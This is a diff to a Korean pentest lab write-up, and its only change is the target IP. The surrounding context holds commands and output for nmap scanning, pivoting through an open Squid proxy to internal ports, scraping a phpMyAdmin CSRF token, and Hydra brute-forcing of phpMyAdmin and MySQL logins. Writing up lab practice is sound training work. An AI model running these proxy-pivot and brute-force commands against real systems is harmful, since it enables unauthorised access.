@@ -12,19 +12,19 @@ ps aux | grep openvpn
 apt install iproute2
 ip a | grep tun
 
-# 192.168.58.189
+# 192.168.66.189
 ```
 
 ## 1. 스캔
 
 ```text
 ┌──(root㉿docker-desktop)-[/]
-└─# nmap -Pn -O -oN nmap.txt -sV -sC -p- 192.168.58.189 --stats-every 1m
+└─# nmap -Pn -O -oN nmap.txt -sV -sC -p- 192.168.66.189 --stats-every 1m
 
 ┌──(root㉿docker-desktop)-[/]
-└─# nmap -Pn -O -oN nmap.txt -sC -sV -p- 192.168.58.189
+└─# nmap -Pn -O -oN nmap.txt -sC -sV -p- 192.168.66.189
 Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-16 09:45 +0000
-Nmap scan report for 192.168.58.189
+Nmap scan report for 192.168.66.189
 Host is up (0.091s latency).
 Not shown: 65529 filtered tcp ports (no-response)
 PORT STATE SERVICE VERSION
@@ -62,11 +62,11 @@ Nmap done: 1 IP address (1 host up) scanned in 236.62 seconds
 
 ```text
 ┌──(root㉿docker-desktop)-[/]
-└─# smbclient -L 192.168.58.189 -N
+└─# smbclient -L 192.168.66.189 -N
 session setup failed: NT_STATUS_ACCESS_DENIED
 
 ┌──(root㉿docker-desktop)-[/]
-└─# smbclient //192.168.58.189/anonymous -N
+└─# smbclient //192.168.66.189/anonymous -N
 session setup failed: NT_STATUS_ACCESS_DENIED
 ```
 
@@ -75,7 +75,7 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 ## 3. Squid
 
 ```bash
-http http://192.168.58.189:3128
+http http://192.168.66.189:3128
 ```
 
 ```text
@@ -196,8 +196,8 @@ SquidGuard 1.x - NULL URL Character Unauthorized Access | linux/remote/23848.txt
 - `-x` : proxy 서버 지정
 
 ```bash
-curl -x http://192.168.58.189:3128 192.168.58.189
-curl -x http://192.168.58.189:3128 http://192.168.58.189
+curl -x http://192.168.66.189:3128 192.168.66.189
+curl -x http://192.168.66.189:3128 http://192.168.66.189
 ```
 
 ```text
@@ -230,17 +230,17 @@ Released for free under a Creative Commons Attribution 2.5 License
 <hr>
 
 <div id="content">
-<p>The following error was encountered while trying to retrieve the URL: <a href="http://192.168.58.189/">http://192.168.58.189/</a></p>
+<p>The following error was encountered while trying to retrieve the URL: <a href="http://192.168.66.189/">http://192.168.66.189/</a></p>
 
 <blockquote id="error">
-<p><b>Connection to 192.168.58.189 failed.</b></p>
+<p><b>Connection to 192.168.66.189 failed.</b></p>
 </blockquote>
 
 <p id="sysmsg">The system returned: <i>(111) Connection refused</i></p>
 
 <p>The remote host or network may be down. Please try the request again.</p>
 
-<p>Your cache administrator is <a href="mailto:webmaster?subject=CacheErrorInfo%20-%20ERR_CONNECT_FAIL&amp;body=CacheHost%3A%20SQUID%0D%0AErrPage%3A%20ERR_CONNECT_FAIL%0D%0AErr%3A%20(111)%20Connection%20refused%0D%0ATimeStamp%3A%20Mon,%2019%20Oct%202026%2008%3A30%3A20%20GMT%0D%0A%0D%0AClientIP%3A%20192.168.45.248%0D%0AServerIP%3A%20192.168.58.189%0D%0A%0D%0AHTTP%20Request%3A%0D%0AGET%20%2F%20HTTP%2F1.1%0AUser-Agent%3A%20curl%2F8.22.0%0D%0AAccept%3A%20*%2F*%0D%0AProxy-Connection%3A%20Keep-Alive%0D%0AHost%3A%20192.168.58.189%0D%0A%0D%0A%0D%0A">webmaster</a>.</p>
+<p>Your cache administrator is <a href="mailto:webmaster?subject=CacheErrorInfo%20-%20ERR_CONNECT_FAIL&amp;body=CacheHost%3A%20SQUID%0D%0AErrPage%3A%20ERR_CONNECT_FAIL%0D%0AErr%3A%20(111)%20Connection%20refused%0D%0ATimeStamp%3A%20Mon,%2019%20Oct%202026%2008%3A30%3A20%20GMT%0D%0A%0D%0AClientIP%3A%20192.168.45.248%0D%0AServerIP%3A%20192.168.66.189%0D%0A%0D%0AHTTP%20Request%3A%0D%0AGET%20%2F%20HTTP%2F1.1%0AUser-Agent%3A%20curl%2F8.22.0%0D%0AAccept%3A%20*%2F*%0D%0AProxy-Connection%3A%20Keep-Alive%0D%0AHost%3A%20192.168.66.189%0D%0A%0D%0A%0D%0A">webmaster</a>.</p>
 
 <br
 </div>
@@ -259,20 +259,20 @@ Released for free under a Creative Commons Attribution 2.5 License
 
 ```text
 [ProxyList]
-http 192.168.58.189 3128
+http 192.168.66.189 3128
 ```
 
 - 프록시 활용한 내부 스캔
 - 프록시 체인이 TPC만 지원하므로 -sT 명시
 
 ```bash
-proxychains nmap -sT -p- -Pn 192.168.58.189
-proxychains nmap -sT -sV -sC -p- --open -Pn -oN proxy_scan.txt 192.168.58.189
+proxychains nmap -sT -p- -Pn 192.168.66.189
+proxychains nmap -sT -sV -sC -p- --open -Pn -oN proxy_scan.txt 192.168.66.189
 ```
 
 ```text
 ┌──(root㉿docker-desktop)-[/]
-└─# proxychains nmap -sV -sC -p- --open -Pn -oN proxy_scan.txt 192.168.58.189
+└─# proxychains nmap -sV -sC -p- --open -Pn -oN proxy_scan.txt 192.168.66.189
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
@@ -280,37 +280,37 @@ proxychains nmap -sT -sV -sC -p- --open -Pn -oN proxy_scan.txt 192.168.58.189
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] DLL init: proxychains-ng 4.17
 Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-19 08:42 +0000
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:135 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:139 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:49666 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:49667 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:39458 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:7587 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:49667 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:49666 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:135 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:139 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:49666 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:135 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:139 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:49667 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 192.168.58.189:445 <--socket error or timeout!
-Nmap scan report for 192.168.58.189
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:135 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:139 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:445 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:3128 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:49666 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:49667 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:39458 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:7587 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:3128 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:3128 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:3128 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:3128 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:49667 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:445 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:49666 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:135 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:139 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:49666 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:135 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:139 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:3128 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:445 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:49667 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:445 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:445 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:445 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:445 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:445 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:445 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 192.168.66.189:445 <--socket error or timeout!
+Nmap scan report for 192.168.66.189
 Host is up (0.097s latency).
 Not shown: 65529 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
@@ -345,43 +345,43 @@ proxychains nmap -sT -p- --open -Pn 127.0.0.1
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] DLL init: proxychains-ng 4.17
 Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-19 08:56 +0000
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:3306 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:1025 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:256 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:22 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:443 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:8888 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:8080 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:995 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:199 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:25 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:113 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:587 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:5900 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:111 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:993 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:1720 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:21 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:139 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:135 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:3389 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:23 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:53 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:554 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:143 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:110 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:1723 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:80 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:22370 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:20610 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:31099 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:32076 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:39696 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:3640 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:15877 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:10693 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:51762
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:3306 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:1025 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:256 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:22 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:443 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:8888 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:8080 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:995 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:445 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:199 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:25 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:113 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:587 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:5900 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:111 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:993 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:1720 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:21 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:139 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:135 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:3389 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:23 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:53 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:554 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:143 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:110 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:1723 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:80 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:22370 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:20610 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:31099 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:32076 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:39696 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:3640 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:15877 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:10693 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:51762
 ```
 
 - proxychains http 127.0.0.1:8080
@@ -393,7 +393,7 @@ Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-19 08:56 +0000
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
-[proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:80 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:80 <--socket error or timeout!
 
 http: error: ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: / (Caused by NewConnectionError("HTTPConnection(host='127.0.0.1', port=80): Failed to establish a new connection: [Errno 111] Connection refused")) while doing a GET request to URL: http://127.0.0.1:80/
 ```
@@ -401,11 +401,11 @@ http: error: ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=80): Max
 ## 5. 내부 웹
 
 - CURL 활용해서 접근
-- curl -x http://192.168.58.189:3128 http://127.0.0.1:8080
+- curl -x http://192.168.66.189:3128 http://127.0.0.1:8080
 
 ```text
 ┌──(root㉿docker-desktop)-[/]
-└─# curl -x http://192.168.58.189:3128 http://127.0.0.1:8080
+└─# curl -x http://192.168.66.189:3128 http://127.0.0.1:8080
 <!DOCTYPE html>
 <html>
 <head>
@@ -546,10 +546,10 @@ if (select.addEventListener) {
 ```
 
 ```text
-curl -x http://192.168.58.189:3128 http://127.0.0.1:8080/phpmyadmin
+curl -x http://192.168.66.189:3128 http://127.0.0.1:8080/phpmyadmin
 
 ┌──(root㉿docker-desktop)-[/]
-└─# curl -x http://192.168.58.189:3128 http://127.0.0.1:8080/phpmyadmin
+└─# curl -x http://192.168.66.189:3128 http://127.0.0.1:8080/phpmyadmin
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>301 Moved Permanently</title>
@@ -561,11 +561,11 @@ curl -x http://192.168.58.189:3128 http://127.0.0.1:8080/phpmyadmin
 </body></html>
 ```
 
-- curl -x http://192.168.58.189:3128 http://127.0.0.1:8080/phpmyadmin/
+- curl -x http://192.168.66.189:3128 http://127.0.0.1:8080/phpmyadmin/
 
 ```text
 ┌──(root㉿docker-desktop)-[/]
-└─# curl -x http://192.168.58.189:3128 http://127.0.0.1:8080/phpmyadmin/
+└─# curl -x http://192.168.66.189:3128 http://127.0.0.1:8080/phpmyadmin/
 <!doctype html>
 <html lang="en" dir="ltr">
 <head>
@@ -893,7 +893,7 @@ hydra -l root -P /usr/share/wo
 ```
 
 ```bash
-HYDRA_PROXY=http://192.168.58.189:3128 hydra -L users.txt -P passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
+HYDRA_PROXY=http://192.168.66.189:3128 hydra -L users.txt -P passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
 ```
 
 ### 6-1. DB 직접 (실패)
@@ -901,12 +901,12 @@ HYDRA_PROXY=http://192.168.58.189:3128 hydra -L users.txt -P passes.txt -s 8080 
 DB 직접 브루트포스 -> 실패
 
 ```bash
-HYDRA_PROXY=http://192.168.58.189:3128 hydra -l root -P passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
+HYDRA_PROXY=http://192.168.66.189:3128 hydra -l root -P passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
 ```
 
 ```text
 ┌──(root㉿docker-desktop)-[/]
-└─# HYDRA_PROXY=http://192.168.58.189:3128 hydra -l root -P passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
+└─# HYDRA_PROXY=http://192.168.66.189:3128 hydra -l root -P passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:33:49
@@ -921,32 +921,32 @@ Most-Popular-Letter-Passes.txt
 /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt
 
 ```bash
-HYDRA_PROXY=http://192.168.58.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
+HYDRA_PROXY=http://192.168.66.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
 ```
 
 ```text
 ┌──(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Passwords]
-└─# HYDRA_PROXY=http://192.168.58.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
+└─# HYDRA_PROXY=http://192.168.66.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:35:21
 [WARNING] module mysql does not support HYDRA_PROXY* !
-[INFO] Using Connect Proxy: http://192.168.58.189:3128
+[INFO] Using Connect Proxy: http://192.168.66.189:3128
 [WARNING] http:// is an invalid type, must be connect://, socks4:// or socks5:// if you use HYDRA_PROXY, entry ignored
 [ERROR] proxy defined but not valid, exiting
 ```
 
 ```bash
-HYDRA_PROXY=http://192.168.58.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
+HYDRA_PROXY=http://192.168.66.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
 ```
 
 ```text
 ┌──(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Passwords]
-└─# HYDRA_PROXY=http://192.168.58.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
+└─# HYDRA_PROXY=http://192.168.66.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:36:31
-[INFO] Using Connect Proxy: http://192.168.58.189:3128
+[INFO] Using Connect Proxy: http://192.168.66.189:3128
 [WARNING] http:// is an invalid type, must be connect://, socks4:// or socks5:// if you use HYDRA_PROXY, entry ignored
 [ERROR] proxy defined but not valid, exiting
 ```
@@ -995,12 +995,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-19 09:39:
 ## 7. 토큰 확보
 
 ```bash
-   TOKEN=$(curl -s -x http://192.168.58.189:3128 http://127.0.0.1:8080/phpmyadmin/index.php | grep -oP 'name="token" value="\K[^"]+'); echo "token=$TOKEN"
+   TOKEN=$(curl -s -x http://192.168.66.189:3128 http://127.0.0.1:8080/phpmyadmin/index.php | grep -oP 'name="token" value="\K[^"]+'); echo "token=$TOKEN"
 ```
 
 ```text
 ┌──(root㉿docker-desktop)-[/usr/share/wordlists/seclists/Usernames]
-└─# TOKEN=$(curl -s -x http://192.168.58.189:3128 http://127.0.0.1:8080/phpmyadmin/index.php | grep -oP 'name="token" value="\K[^"]+'); echo "token=$TOKEN"
+└─# TOKEN=$(curl -s -x http://192.168.66.189:3128 http://127.0.0.1:8080/phpmyadmin/index.php | grep -oP 'name="token" value="\K[^"]+'); echo "token=$TOKEN"
 token=3f6459722c632d2b667b365b454e6f78
 3f6459722c632d2b667b365b454e6f7
 ```
@@ -1040,7 +1040,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:57:
 [DATA] max 4 tasks per 1 server, overall 4 tasks, 809251 login tries (l:17/p:47603), ~202313 tries per task
 [DATA] attacking http-post-form://127.0.0.1:8080/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=216a2f757c755648564f4c6478424b54
 216a2f757c755648564f4c6478424b54:C=/phpmyadmin/index.php:2=:F=CSRF
-[proxychains] Strict chain ... 192.168.58.189:3128 [proxychains] Strict chain ... 192.168.58.189:3128 [proxychains] Strict chain ... 192.168.58.189:3128 [proxychains] Strict chain ... 192.168.58.189:3128 [ATTEMPT] target 127.0.0.1 - login "root" - pass ""spring" - 1 of 809251 [child 0] (0/0)
+[proxychains] Strict chain ... 192.168.66.189:3128 [proxychains] Strict chain ... 192.168.66.189:3128 [proxychains] Strict chain ... 192.168.66.189:3128 [proxychains] Strict chain ... 192.168.66.189:3128 [ATTEMPT] target 127.0.0.1 - login "root" - pass ""spring" - 1 of 809251 [child 0] (0/0)
 [ATTEMPT] target 127.0.0.1 - login "root" - pass "'buster+'" - 2 of 809251 [child 1] (0/0)
 [ATTEMPT] target 127.0.0.1 - login "root" - pass "++++" - 3 of 809251 [child 2] (0/0)
 [ATTEMPT] target 127.0.0.1 - login "root" - pass "+monday" - 4 of 809251 [child 3] (0/0)
@@ -1048,7 +1048,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:57:
 <--socket error or timeout!
 <--socket error or timeout!
 <--socket error or timeout!
